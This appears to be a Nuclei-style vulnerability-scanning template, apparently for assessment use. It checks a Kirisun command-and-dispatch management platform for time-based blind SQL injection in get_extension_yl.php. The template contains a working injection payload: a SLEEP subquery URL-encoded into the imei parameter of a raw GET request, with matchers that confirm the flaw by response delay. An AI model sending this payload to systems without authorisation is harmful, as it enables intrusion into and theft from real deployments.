id: poc-yaml-kirisun-get-extension-yl-php-sqli
info:
  name: 福建科立讯通信 指挥调度管理平台 get_extension_yl.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    福建科立讯通信 指挥调度管理平台 get_extension_yl.php 存在SQL注入漏洞，允许攻击者通过构造恶意的SQL语句，获取敏感信息，甚至执行任意SQL命令。

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP({{t1}})))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "user not found"
        part: body
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration <= to_number(t2)
